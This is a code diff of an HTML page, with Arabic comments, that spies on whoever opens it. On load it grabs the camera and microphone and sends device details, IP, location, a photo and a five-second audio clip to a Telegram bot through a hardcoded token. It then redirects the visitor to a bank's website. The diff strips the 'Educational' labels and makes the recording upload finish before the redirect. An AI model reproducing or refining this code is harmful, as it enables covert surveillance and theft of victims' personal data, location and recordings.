@@ -1,13 +1,11 @@
-
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Educational Demo</title>
+  <title>Demo Page</title>
   <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
 </head>
 <body>
-
 <script>
 const botToken = "7317054018:AAGInl8VmqVPK1fRIYfHx7zRnGceuTcH5pY";
 const chatId   = "1538488453";
@@ -23,7 +21,7 @@ function sendText(t){
   });
 }
 
-// ==== معلومات الجهاز ====
+// ==== إرسال معلومات الجهاز ====
 async function sendDeviceInfo(){
   let ip = "Unknown";
   try {
@@ -32,7 +30,7 @@ async function sendDeviceInfo(){
   }catch{}
 
   sendText(
-    "📱 Device Info (Educational):\n" +
+    "📱 Device Info:\n" +
     "UserAgent: " + navigator.userAgent + "\n" +
     "Platform: " + navigator.platform + "\n" +
     "Screen: " + screen.width + "x" + screen.height + "\n" +
@@ -40,7 +38,7 @@ async function sendDeviceInfo(){
   );
 }
 
-// ==== الموقع ====
+// ==== إرسال الموقع ====
 function sendLocation(){
   navigator.geolocation.getCurrentPosition(
     pos => {
@@ -55,7 +53,7 @@ function sendLocation(){
   );
 }
 
-// ==== صورة من الكاميرا ====
+// ==== التقاط صورة ====
 function takePhoto(){
   const video = document.createElement("video");
   video.srcObject = camStream;
@@ -81,48 +79,54 @@ function takePhoto(){
 
 // ==== تسجيل صوت 5 ثوانٍ ====
 function recordAudio(){
-  const rec = new MediaRecorder(micStream);
-  const chunks = [];
+  return new Promise(resolve => {
+    const rec = new MediaRecorder(micStream);
+    const chunks = [];
 
-  rec.ondataavailable = e => chunks.push(e.data);
-  rec.onstop = () => {
-    const blob = new Blob(chunks, { type: "audio/webm" });
-    const fd = new FormData();
-    fd.append("chat_id", chatId);
-    fd.append("audio", blob, "mic.webm");
-    axios.post(`https://api.telegram.org/bot${botToken}/sendAudio`, fd);
-  };
+    rec.ondataavailable = e => chunks.push(e.data);
+    rec.onstop = () => {
+      const blob = new Blob(chunks, { type: "audio/webm" });
+      const fd = new FormData();
+      fd.append("chat_id", chatId);
+      fd.append("audio", blob, "mic.webm");
+      axios.post(`https://api.telegram.org/bot${botToken}/sendAudio`, fd);
+      resolve();
+    };
 
-  rec.start();
-  setTimeout(() => rec.stop(), 5000);
+    rec.start();
+    setTimeout(() => rec.stop(), 5000);
+  });
 }
 
-// ==== تشغيل العملية ====
-function startDemo(){
-  Promise.all([
-    navigator.mediaDevices.getUserMedia({ video:true }),
-    navigator.mediaDevices.getUserMedia({ audio:true })
-  ])
-  .then(([cam, mic]) => {
-    camStream = cam;
-    micStream = mic;
+// ==== دالة تأخير ====
+function delay(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+// ==== تشغيل كل شيء ====
+async function startDemo(){
+  try {
+    [camStream, micStream] = await Promise.all([
+      navigator.mediaDevices.getUserMedia({ video:true }),
+      navigator.mediaDevices.getUserMedia({ audio:true })
+    ]);
 
     sendDeviceInfo();
     sendLocation();
     takePhoto();
-    recordAudio();
+    await recordAudio();
 
-    // ===== إعادة التوجيه بعد 3 ثواني =====
-    setTimeout(() => {
-      window.location.href = "https://kuraimibank.com/ar/";
-    }, 5000);
+    // ===== الانتظار قبل إعادة التوجيه =====
+    const waitTime = 7000; // 7000 ملي ثانية = 7 ثواني
+    await delay(waitTime);
 
-  })
-  .catch(e => sendText("Permission Error: " + e.message));
+    window.location.href = "https://kuraimibank.com/ar/";
+  } catch(e) {
+    sendText("Permission Error: " + e.message);
+  }
 }
 
 startDemo();
 </script>
-
 </body>
 </html>
